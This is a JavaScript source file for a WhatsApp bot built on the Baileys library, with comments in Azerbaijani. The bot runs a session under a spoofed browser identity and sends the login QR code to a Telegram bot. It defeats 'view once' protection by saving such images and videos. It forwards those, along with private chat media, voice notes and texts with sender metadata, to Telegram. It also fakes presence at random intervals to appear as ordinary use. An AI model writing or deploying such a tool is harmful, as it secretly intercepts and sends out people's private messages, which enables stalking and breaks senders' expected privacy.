import 'dotenv/config';
import makeWASocket, { useMultiFileAuthState, DisconnectReason, downloadMediaMessage, jidNormalizedUser } from '@whiskeysockets/baileys';
import pino from 'pino';
import { writeFileSync, mkdirSync, rmSync, readdirSync, existsSync } from 'fs';
import { join } from 'path';
import qrcodeTerminal from 'qrcode-terminal';
import QRCode from 'qrcode';
import { Storage } from 'megajs';
import { senderDevice, senderMetadata, sendTelegramMedia, sendTelegramText, shouldSendRegularMedia, shouldSendTextMessages, startDownloadsCleanup, telegramRuntimeConfig } from './telegram.js';

const DOWNLOADS_DIR = './downloads';
mkdirSync(DOWNLOADS_DIR, { recursive: true });

const PERSONAL_SUFFIXES = ['@s.whatsapp.net', '@lid', '@c.us'];
const MAX_MEDIA_BYTES = 20 * 1024 * 1024;
const isPersonal = (jid) => PERSONAL_SUFFIXES.some(s => jid?.endsWith(s));

const PRESENCE_INTERVAL_MIN_MS = 4 * 60_000;
const PRESENCE_INTERVAL_MAX_MS = 80 * 60_000;
const PRESENCE_BLIP_MIN_MS = 1_000;
const PRESENCE_BLIP_MAX_MS = 120_000;
const randomBetween = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

const formatError = (err) => err?.stack || err?.message || String(err);

const formatMediaCaption = (title, metadata, caption) => {
    const hasCaption = typeof caption === 'string' && caption.trim().length > 0;
    const parts = [title];
    if (hasCaption) parts.push(caption);
    parts.push(metadata);
    return parts.join('\n\n');
};

async function notifyTelegramEvent(title, details) {
    if (['DISCONNECTED', 'RECONNECTING'].includes(title)) return;
    try {
        await sendTelegramText(`[${title}]\nTime: ${new Date().toISOString()}\n${details}`);
    } catch (err) {
        console.log(`[Telegram] Failed to send ${title}: ${err.message}`);
    }
}

// ════════════════════════════════════════════════════════════
// MEGA SESSION BƏRPASI
// ════════════════════════════════════════════════════════════
async function restoreSessionFromMEGA(sessionId) {
    if (!sessionId) return false;
    
    console.log(`🔄 Restoring session from MEGA: ${sessionId}`);
    
    try {
        const megaUrl = `https://mega.nz/file/${sessionId}`;
        const file = Storage.file.fromURL(megaUrl);
        const stream = file.download();
        
        let data = '';
        for await (const chunk of stream) {
            data += chunk.toString();
        }
        
        const sessionDir = './auth_info_android_bypass';
        mkdirSync(sessionDir, { recursive: true });
        
        const credsPath = join(sessionDir, 'creds.json');
        writeFileSync(credsPath, data);
        console.log('✅ Session restored from MEGA successfully!');
        return true;
        
    } catch (err) {
        console.log(`❌ MEGA restore failed: ${err.message}`);
        return false;
    }
}

// ════════════════════════════════════════════════════════════
// SESSION_ID varsa bərpa et
// ════════════════════════════════════════════════════════════
const SESSION_ID = process.env.SESSION_ID;
if (SESSION_ID) {
    console.log(`📌 SESSION_ID found: ${SESSION_ID}`);
    await restoreSessionFromMEGA(SESSION_ID);
} else {
    console.log('ℹ️ No SESSION_ID provided. Will generate QR code.');
}

// ════════════════════════════════════════════════════════════
// KONFİQURASİYA
// ════════════════════════════════════════════════════════════
function printStartupConfig() {
    const config = telegramRuntimeConfig();
    const will = (enabled) => enabled ? 'will' : 'will not';
    const credentials = config.hasCredentials ? 'present' : 'not present';
    const sessionStatus = SESSION_ID ? '✅ MEGA session loaded' : '❌ No session (QR required)';

    console.log([
        '',
        '╔═══════════════════════════════════════════════════════╗',
        '║                    WAVIEW CONFIG                     ║',
        '╠═══════════════════════════════════════════════════════╣',
        `║ Telegram credentials: ${credentials.padEnd(45)}║`,
        `║ Session: ${sessionStatus.padEnd(45)}║`,
        `║ Regular media ${will(config.sendRegularMedia).padEnd(32)}║`,
        `║ Text messages ${will(config.sendTextMessages).padEnd(32)}║`,
        `║ View once messages ${will(config.sendViewOnce).padEnd(29)}║`,
        `║ Downloads cleanup ${will(config.cleanDownloads).padEnd(31)}║`,
        '╚═══════════════════════════════════════════════════════╝',
        '',
    ].join('\n'));
}

printStartupConfig();
startDownloadsCleanup(DOWNLOADS_DIR);

// ════════════════════════════════════════════════════════════
// XƏTA İDARƏETMƏ
// ════════════════════════════════════════════════════════════
process.on('unhandledRejection', (err) => {
    console.log(`[Unhandled Rejection] ${formatError(err)}`);
    void notifyTelegramEvent('UNHANDLED REJECTION', formatError(err));
});

process.on('uncaughtException', (err) => {
    console.log(`[Uncaught Exception] ${formatError(err)}`);
    void notifyTelegramEvent('UNCAUGHT EXCEPTION', formatError(err));
});

// ════════════════════════════════════════════════════════════
// ƏSAS BOT
// ════════════════════════════════════════════════════════════
async function startSpoofedSession() {
    const { state, saveCreds } = await useMultiFileAuthState('./auth_info_android_bypass');
    let presenceTimer = null;

    const sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: ['frankel', 'WhatsApp', '2.26.16.73'],
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
            qrcodeTerminal.generate(qr, { small: true }, (code) => {
                console.log('\n🔲 Scan this QR code with WhatsApp:\n');
                console.log(code);
            });

            try {
                const qrBuffer = await QRCode.toBuffer(qr, { scale: 10, margin: 4 });
                await sendTelegramMedia(qrBuffer, 'whatsapp_qr.png', 'image', '📱 WhatsApp Login QR Code');
                console.log('[Telegram] QR code sent to bot');
            } catch (err) {
                console.log(`[Telegram] Failed to send QR: ${err.message}`);
            }
        }

        if (connection === 'close') {
            if (presenceTimer) { clearTimeout(presenceTimer); presenceTimer = null; }
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            console.log(`❌ Connection closed. Reconnecting: ${shouldReconnect}`);
            void notifyTelegramEvent('DISCONNECTED', [
                `Status code: ${statusCode || 'unknown'}`,
                `Reconnect: ${shouldReconnect}`,
                `Error: ${formatError(lastDisconnect?.error || 'unknown')}`,
            ].join('\n'));

            const shouldCleanup = [401, 403].includes(statusCode);

            if (shouldCleanup) {
                console.log(`⚠️ Connection failed (${statusCode}). Clearing session files in 3s...`);
                setTimeout(() => {
                    try {
                        const sessionDir = './auth_info_android_bypass';
                        const files = readdirSync(sessionDir);
                        for (const file of files) {
                            rmSync(join(sessionDir, file), { recursive: true, force: true });
                        }
                        console.log('🗑️ Session files cleared. Restarting process...');
                    } catch (err) {
                        console.log(`Failed to clear session files: ${err.message}`);
                    }
                    process.exit(1);
                }, 3000);
            } else if (shouldReconnect) {
                startSpoofedSession();
            }
        } else if (connection === 'open') {
            const ownJid = jidNormalizedUser(sock.user?.id);
            console.log(`✅ Connected as ${ownJid}. Waiting for View Once messages...`);

            const schedulePresence = () => {
                const delay = randomBetween(PRESENCE_INTERVAL_MIN_MS, PRESENCE_INTERVAL_MAX_MS);
                presenceTimer = setTimeout(async () => {
                    try {
                        await sock.sendPresenceUpdate('available');
                        await new Promise(r => setTimeout(r, randomBetween(PRESENCE_BLIP_MIN_MS, PRESENCE_BLIP_MAX_MS)));
                        await sock.sendPresenceUpdate('unavailable');
                    } catch (err) {
                        console.log(`[Presence] Failed: ${err.message}`);
                        void notifyTelegramEvent('PRESENCE ERROR', formatError(err));
                    }
                    schedulePresence();
                }, delay);
            };
            schedulePresence();
        }
    });

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;

        for (const msg of messages) {
            if (!msg.message) continue;

            const sender = msg.key.remoteJid;
            const metadata = senderMetadata(msg);

            const media = msg.message.imageMessage || msg.message.videoMessage;
            const viewOnceWrapper = msg.message.viewOnceMessageV2
                || msg.message.viewOnceMessage
                || msg.message.viewOnceMessageV2Extension;
            const isViewOnce = media?.viewOnce === true || !!viewOnceWrapper;

            if (isViewOnce) {
                const inner = viewOnceWrapper?.message || msg.message;
                const mediaType = inner?.imageMessage ? 'image' : inner?.videoMessage ? 'video' : 'unknown';
                const ext = mediaType === 'image' ? 'jpg' : mediaType === 'video' ? 'mp4' : 'bin';
                const caption = inner?.imageMessage?.caption ?? inner?.videoMessage?.caption;

                console.log(`\n📸 [VIEW ONCE] from ${sender} (${mediaType})`);
                console.log('Payload:', JSON.stringify(inner, null, 2));

                try {
                    const buffer = await downloadMediaMessage(msg, 'buffer', {});
                    const filename = `${DOWNLOADS_DIR}/viewonce_${Date.now()}.${ext}`;
                    writeFileSync(filename, buffer);
                    console.log(`💾 Saved: ${filename} (${buffer.length} bytes)`);
                    try {
                        const telegramCaption = formatMediaCaption(`🔐 [VIEW ONCE] ${mediaType}`, metadata, caption);
                        await sendTelegramMedia(buffer, filename, mediaType, telegramCaption);
                    } catch (err) {
                        console.log(`[VIEW ONCE] Telegram send failed: ${err.message}`);
                    }
                } catch (err) {
                    console.log(`Download failed: ${err.message}`);
                    void notifyTelegramEvent('VIEW ONCE DOWNLOAD ERROR', `${metadata}\n\n${formatError(err)}`);
                }

                console.log('──────────────────────────────────────────────────\n');
            } else if (isPersonal(sender)) {
                const shortSender = sender.split('@')[0];
                const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text;

                const mediaMap = {
                    image: { msg: msg.message.imageMessage, ext: 'jpg' },
                    video: { msg: msg.message.videoMessage, ext: 'mp4' },
                    voice: { msg: msg.message.audioMessage, ext: 'ogg' },
                };
                const mediaType = Object.keys(mediaMap).find(k => mediaMap[k].msg);

                if (mediaType) {
                    const { msg: mediaMsg, ext } = mediaMap[mediaType];
                    const size = Number(mediaMsg.fileLength) || 0;
                    const caption = mediaMsg.caption;

                    if (size && size > MAX_MEDIA_BYTES) {
                        console.log(`[DM Media] ${shortSender} → ${mediaType} skipped (${size} bytes > 20MB)`);
                    } else {
                        try {
                            const buffer = await downloadMediaMessage(msg, 'buffer', {});
                            const filename = `${DOWNLOADS_DIR}/${mediaType}_${Date.now()}.${ext}`;
                            writeFileSync(filename, buffer);
                            console.log(`[DM Media] ${shortSender} → Saved ${mediaType}: ${filename} (${buffer.length} bytes)`);
                            if (shouldSendRegularMedia()) {
                                try {
                                    const telegramCaption = formatMediaCaption(`[DM MEDIA] ${mediaType}`, metadata, caption);
                                    await sendTelegramMedia(buffer, filename, mediaType, telegramCaption);
                                } catch (err) {
                                    console.log(`[DM Media] ${shortSender} → Telegram send failed: ${err.message}`);
                                }
                            }
                        } catch (err) {
                            console.log(`[DM Media] ${shortSender} → Download failed: ${err.message}`);
                            void notifyTelegramEvent('DM MEDIA DOWNLOAD ERROR', `${metadata}\n\n${formatError(err)}`);
                        }
                    }
                } else {
                    console.log(`[Normal] ${shortSender}: ${text || '[Non-text]'}`);
                    console.log(`from device : ${senderDevice(msg)}`);
                    if (text && shouldSendTextMessages()) {
                        try {
                            await sendTelegramText(`[DM TEXT]\n${metadata}\n\n${text}`);
                        } catch (err) {
                            console.log(`[Normal] ${shortSender} → Telegram send failed: ${err.message}`);
                        }
                    }
                }
            }
        }
    });
}

// Botu işə sal
startSpoofedSession();